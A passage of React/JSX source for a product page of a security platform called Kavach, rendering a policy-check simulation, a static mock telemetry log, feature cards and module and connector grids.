                    <div style={{ padding: '8px 10px', borderRadius: '6px', backgroundColor: simStep >= 3 ? '#FEF2F2' : '#FFFFFF', border: `1px solid ${simStep >= 3 ? '#FECACA' : '#E2E8F0'}`, textAlign: 'center' }}>
                      <div style={{ fontSize: '10px', color: '#64748B' }}>Step 3</div>
                      <div style={{ fontSize: '11px', fontWeight: 700, color: simStep >= 3 ? '#991B1B' : '#94A3B8' }}>OPA Policy Check</div>
                    </div>
                    <div style={{ padding: '8px 10px', borderRadius: '6px', backgroundColor: simStep >= 4 ? '#ECFDF5' : '#FFFFFF', border: `1px solid ${simStep >= 4 ? '#A7F3D0' : '#E2E8F0'}`, textAlign: 'center' }}>
                      <div style={{ fontSize: '10px', color: '#64748B' }}>Step 4</div>
                      <div style={{ fontSize: '11px', fontWeight: 700, color: simStep >= 4 ? '#065F46' : '#94A3B8' }}>Signed Evidence</div>
                    </div>
                  </div>

                  {/* Simulation Outcome Report */}
                  {simulationCompleted && (
                    <div
                      style={{
                        marginTop: '4px',
                        padding: '12px 14px',
                        borderRadius: '8px',
                        backgroundColor: activeScenario.expectedDecision === 'BLOCKED' ? '#FEF2F2' : '#F0FDF4',
                        border: `1px solid ${activeScenario.expectedDecision === 'BLOCKED' ? '#F87171' : '#86EFAC'}`,
                        display: 'flex',
                        flexDirection: 'column',
                        gap: '6px',
                      }}
                    >
                      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                        <span style={{ fontSize: '12px', fontWeight: 800, color: activeScenario.expectedDecision === 'BLOCKED' ? '#B91C1C' : '#15803D' }}>
                          DETERMINISTIC VERDICT: {activeScenario.expectedDecision}
                        </span>
                        <span style={{ fontSize: '11px', fontWeight: 600, color: '#475569' }}>
                          Evaluated in {activeScenario.evalLatency}
                        </span>
                      </div>
                      <div style={{ fontSize: '12px', color: '#1E293B' }}>
                        <strong>Enforcing Engine:</strong> {activeScenario.enforcingPlane}
                      </div>
                      <div style={{ fontSize: '11.5px', color: '#475569' }}>
                        <strong>Rule:</strong> {activeScenario.ruleId} — {activeScenario.ruleTitle}
                      </div>
                      <div style={{ fontFamily: 'ui-monospace, monospace', fontSize: '10.5px', color: '#64748B', borderTop: '1px solid rgba(0,0,0,0.06)', paddingTop: '6px', marginTop: '2px' }}>
                        Receipt: {activeScenario.evidenceSignature}
                      </div>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* ========================================================= */}
            {/* TAB 3: LIVE TELEMETRY TERMINAL STREAM */}
            {/* ========================================================= */}
            {visualizerTab === 'telemetry' && (
              <div
                style={{
                  backgroundColor: '#0F172A',
                  color: '#F8FAFC',
                  borderRadius: '10px',
                  padding: '16px 18px',
                  fontFamily: 'ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace',
                  fontSize: '12px',
                  lineHeight: 1.6,
                  minHeight: '380px',
                  display: 'flex',
                  flexDirection: 'column',
                  gap: '8px',
                  overflowY: 'auto',
                }}
              >
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderBottom: '1px solid #1E293B', paddingBottom: '8px', marginBottom: '4px' }}>
                  <span style={{ color: '#38BDF8', fontWeight: 700 }}>[KAVACH LIVE TELEMETRY STREAM]</span>
                  <span style={{ color: '#4ADE80', fontSize: '11px' }}>● 100% INVARIANTS HEALTHY</span>
                </div>
                <div style={{ color: '#94A3B8' }}>[09:44:01] <span style={{ color: '#38BDF8' }}>SYS-CORE:</span> Initialized OPA Rego v1.0 engine on root authority cluster.</div>
                <div style={{ color: '#94A3B8' }}>[09:44:06] <span style={{ color: '#4ADE80' }}>CI-GATE:</span> Scanned commit 4f9e12 on repo &apos;api-gateway&apos;. Semgrep AST 0 findings.</div>
                <div style={{ color: '#94A3B8' }}>[09:44:11] <span style={{ color: '#F87171' }}>OPA-REGO:</span> Blocked tool execution from agent &apos;cursor-ai&apos; (SEC-INV-402 violated) [13.8ms].</div>
                <div style={{ color: '#94A3B8' }}>[09:44:14] <span style={{ color: '#C084FC' }}>MCP-AUTH:</span> Issued mTLS ephemeral token for Cline swarm session #sess_8819.</div>
                <div style={{ color: '#94A3B8' }}>[09:44:19] <span style={{ color: '#FACC15' }}>EBPF-RT:</span> Intercepted syscall: connect(198.51.100.1:443) from pod/orders-svc -&gt; ALLOWED.</div>
                <div style={{ color: '#94A3B8' }}>[09:44:23] <span style={{ color: '#4ADE80' }}>EVIDENCE:</span> Cryptographic receipt Ed25519 #sig_901198 persisted to PostgreSQL ledger.</div>
                <div style={{ color: '#94A3B8' }}>[09:44:27] <span style={{ color: '#38BDF8' }}>K8S-ADM:</span> Admission webhook validated container image digest sha256:d891...</div>
                <div style={{ color: '#38BDF8', marginTop: '12px' }}>&gt; Waiting for incoming agent tool requests and runtime telemetry...</div>
              </div>
            )}
          </div>
        </div>

        {/* ========================================================= */}
        {/* BOTTOM 4 FEATURE CARDS (Grid of 4) */}
        {/* ========================================================= */}
        <div
          style={{
            display: 'grid',
            gridTemplateColumns: 'repeat(4, 1fr)',
            gap: '24px',
            marginTop: '64px',
            paddingTop: '48px',
            borderTop: '1px solid #E2E8F0',
          }}
          className="features-grid"
        >
          {/* Card 1 */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
            <div
              style={{
                width: '38px',
                height: '38px',
                borderRadius: '8px',
                backgroundColor: '#EFF6FF',
                color: '#2563EB',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                marginBottom: '4px',
              }}
            >
              <Eye size={20} />
            </div>
            <h2 style={{ fontSize: '16px', fontWeight: 700, color: '#0F172A', margin: 0 }}>
              Complete visibility
            </h2>
            <p style={{ fontSize: '13px', color: '#475569', lineHeight: 1.5, margin: 0 }}>
              Unified posture across code, cloud, runtime, sensitive data, and autonomous AI agents in one place.
            </p>
          </div>

          {/* Card 2 */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
            <div
              style={{
                width: '38px',
                height: '38px',
                borderRadius: '8px',
                backgroundColor: '#ECFDF5',
                color: '#059669',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                marginBottom: '4px',
              }}
            >
              <Code2 size={20} />
            </div>
            <h2 style={{ fontSize: '16px', fontWeight: 700, color: '#0F172A', margin: 0 }}>
              Built for developers
            </h2>
            <p style={{ fontSize: '13px', color: '#475569', lineHeight: 1.5, margin: 0 }}>
              Native GitHub/GitLab pull request gates with automated AST validation and 1-click verified AutoFixes.
            </p>
          </div>

          {/* Card 3 */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
            <div
              style={{
                width: '38px',
                height: '38px',
                borderRadius: '8px',
                backgroundColor: '#FFF7ED',
                color: '#EA580C',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                marginBottom: '4px',
              }}
            >
              <ShieldCheck size={20} />
            </div>
            <h2 style={{ fontSize: '16px', fontWeight: 700, color: '#0F172A', margin: 0 }}>
              Deterministic Policy Core
            </h2>
            <p style={{ fontSize: '13px', color: '#475569', lineHeight: 1.5, margin: 0 }}>
              Open Policy Agent (OPA) evaluates compiled Rego v1.0 rules in &lt;20ms. Zero LLM hallucination risk.
            </p>
          </div>

          {/* Card 4 */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
            <div
              style={{
                width: '38px',
                height: '38px',
                borderRadius: '8px',
                backgroundColor: '#F5F3FF',
                color: '#7C3AED',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                marginBottom: '4px',
              }}
            >
              <Zap size={20} />
            </div>
            <h2 style={{ fontSize: '16px', fontWeight: 700, color: '#0F172A', margin: 0 }}>
              Cryptographic Proof
            </h2>
            <p style={{ fontSize: '13px', color: '#475569', lineHeight: 1.5, margin: 0 }}>
              Every ALLOW / BLOCK determination is signed with Ed25519 and logged in tamper-evident PostgreSQL storage.
            </p>
          </div>
        </div>

        {/* ========================================================= */}
        {/* LOWER SECTION: Software Delivery Lifecycle & Pillars */}
        {/* ========================================================= */}
        <div style={{ marginTop: '64px', display: 'flex', flexDirection: 'column', gap: '32px' }}>
          {/* Section Heading */}
          <div style={{ textAlign: 'center', maxWidth: '640px', margin: '0 auto' }}>
            <h2 style={{ fontSize: '26px', fontWeight: 800, color: '#0F172A', margin: 0, letterSpacing: '-0.02em' }}>
              Full-Lifecycle Security Orchestration
            </h2>
            <p style={{ fontSize: '14px', color: '#64748B', marginTop: '6px' }}>
              Inspect quality gates and deterministic policy boundaries across every phase of software delivery.
            </p>
          </div>

          {/* Lifecycle Stages Stepper */}
          <div
            style={{
              display: 'grid',
              gridTemplateColumns: 'repeat(5, 1fr)',
              gap: '12px',
            }}
            className="lifecycle-grid"
          >
            {lifecycleStages.map((stage) => {
              const isCurrent = activeStage === stage.id;
              return (
                <div
                  key={stage.id}
                  onClick={() => setActiveStage(stage.id as any)}
                  style={{
                    padding: '16px 14px',
                    borderRadius: '10px',
                    border: `1.5px solid ${isCurrent ? '#2563EB' : '#E2E8F0'}`,
                    backgroundColor: isCurrent ? '#EFF6FF' : '#FFFFFF',
                    display: 'flex',
                    flexDirection: 'column',
                    alignItems: 'center',
                    textAlign: 'center',
                    gap: '6px',
                    cursor: 'pointer',
                    boxShadow: isCurrent ? '0 4px 12px rgba(37, 99, 235, 0.08)' : 'none',
                    transition: 'all 0.15s ease',
                  }}
                >
                  <div style={{ color: isCurrent ? '#2563EB' : '#475569' }}>{stage.icon}</div>
                  <span style={{ fontSize: '13px', fontWeight: 700, color: isCurrent ? '#1E40AF' : '#0F172A' }}>
                    {stage.name}
                  </span>
                  <span style={{ fontSize: '11px', color: '#64748B' }}>{stage.audience}</span>
                </div>
              );
            })}
          </div>

          {/* Active Lifecycle Stage Callout */}
          <div
            style={{
              padding: '16px 20px',
              borderRadius: '10px',
              backgroundColor: '#F8FAFC',
              border: '1px solid #E2E8F0',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
              gap: '16px',
              flexWrap: 'wrap',
            }}
          >
            <div>
              <div style={{ fontSize: '11px', fontWeight: 700, color: '#2563EB', textTransform: 'uppercase' }}>
                Active Phase Gate: {lifecycleStages.find((s) => s.id === activeStage)?.name}
              </div>
              <div style={{ fontSize: '13px', color: '#334155', marginTop: '2px' }}>
                {lifecycleStages.find((s) => s.id === activeStage)?.description}
              </div>
            </div>
            <div style={{ fontFamily: 'ui-monospace, monospace', fontSize: '12px', color: '#0F172A', backgroundColor: '#FFFFFF', padding: '6px 12px', borderRadius: '6px', border: '1px solid #CBD5E1' }}>
              {lifecycleStages.find((s) => s.id === activeStage)?.tools}
            </div>
          </div>

          {/* 5 Security Pillars */}
          <div
            style={{
              border: '1px solid #E2E8F0',
              borderRadius: '14px',
              padding: '24px',
              backgroundColor: '#FFFFFF',
              boxShadow: '0 4px 6px -1px rgba(0, 0, 0, 0.03)',
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', marginBottom: '20px' }}>
              <KavachMark size={22} />
              <span style={{ fontSize: '15px', fontWeight: 800, color: '#0F172A', letterSpacing: '-0.02em' }}>
                Kavach Core Security Modules
              </span>
            </div>

            <div
              style={{
                display: 'grid',
                gridTemplateColumns: 'repeat(5, 1fr)',
                gap: '12px',
              }}
              className="pillars-grid"
            >
              {pillars.map((pillar) => {
                const isSelected = activePillar === pillar.id;
                return (
                  <div
                    key={pillar.id}
                    onClick={() => setActivePillar(pillar.id)}
                    style={{
                      padding: '14px 12px',
                      borderRadius: '10px',
                      border: `1.5px solid ${isSelected ? '#0F172A' : '#E2E8F0'}`,
                      backgroundColor: isSelected ? '#F8FAFC' : '#FFFFFF',
                      display: 'flex',
                      flexDirection: 'column',
                      alignItems: 'center',
                      textAlign: 'center',
                      gap: '8px',
                      cursor: 'pointer',
                      transition: 'all 0.15s ease',
                    }}
                  >
                    <div
                      style={{
                        width: '36px',
                        height: '36px',
                        borderRadius: '8px',
                        backgroundColor: isSelected ? '#FFFFFF' : pillar.bg,
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                      }}
                    >
                      {pillar.icon}
                    </div>
                    <span style={{ fontSize: '13px', fontWeight: 700, color: '#0F172A' }}>
                      {pillar.title}
                    </span>
                    <span style={{ fontSize: '10.5px', color: '#64748B', lineHeight: 1.2 }}>
                      {pillar.sub}
                    </span>
                  </div>
                );
              })}
            </div>

            {/* Active Pillar Detail Strip */}
            <div
              style={{
                marginTop: '16px',
                padding: '12px 16px',
                borderRadius: '8px',
                backgroundColor: '#F8FAFC',
                border: '1px solid #E2E8F0',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                fontSize: '12px',
                gap: '12px',
                flexWrap: 'wrap',
              }}
            >
              <span style={{ color: '#334155' }}>
                {pillars.find((p) => p.id === activePillar)?.details}
              </span>
              <Link
                href={pillars.find((p) => p.id === activePillar)?.href || '/code'}
                style={{
                  color: '#2563EB',
                  fontWeight: 700,
                  display: 'flex',
                  alignItems: 'center',
                  gap: '4px',
                  textDecoration: 'none',
                  whiteSpace: 'nowrap',
                }}
              >
                <span>Launch module →</span>
              </Link>
            </div>
          </div>

          {/* Unified Data Layer Connectors */}
          <div
            style={{
              backgroundColor: '#F8FAFC',
              borderRadius: '12px',
              border: '1px solid #E2E8F0',
              padding: '18px 20px',
            }}
          >
            <div style={{ textAlign: 'center', marginBottom: '14px' }}>
              <span style={{ fontSize: '13px', fontWeight: 700, color: '#0F172A', textTransform: 'uppercase', letterSpacing: '0.04em' }}>
                Unified Multi-Environment Connectors
              </span>
            </div>

            <div
              style={{
                display: 'grid',
                gridTemplateColumns: 'repeat(4, 1fr)',
                gap: '10px',
              }}
              className="data-layer-grid"
            >
              {dataLayerConnectors.map((item) => (
                <div
                  key={item.name}
                  style={{
                    padding: '8px 12px',
                    borderRadius: '8px',
                    backgroundColor: '#FFFFFF',
                    border: '1px solid #E2E8F0',
                    textAlign: 'center',
                  }}
                >
                  <div style={{ fontSize: '12px', fontWeight: 600, color: '#1E293B' }}>{item.name}</div>
                  <div style={{ fontSize: '10.5px', color: '#64748B' }}>{item.count}</div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </main>

      {/* Global Modals */}
      <SearchModal isOpen={searchOpen} onClose={() => setSearchOpen(false)} />
      <TalkToExpertModal isOpen={expertOpen} onClose={() => setExpertOpen(false)} />

      <style jsx>{`
        @media (max-width: 1080px) {
          .platform-hero-grid {
            grid-template-columns: 1fr !important;
          }
          .features-grid {
            grid-template-columns: repeat(2, 1fr) !important;
          }
        }
        @media (max-width: 720px) {
          .pillars-grid {
            grid-template-columns: repeat(2, 1fr) !important;
          }
          .lifecycle-grid {
            grid-template-columns: repeat(2, 1fr) !important;
          }
          .data-layer-grid {
            grid-template-columns: repeat(2, 1fr) !important;
          }
          .features-grid {
            grid-template-columns: 1fr !important;
          }
        }
      `}</style>
    </div>
  );
}
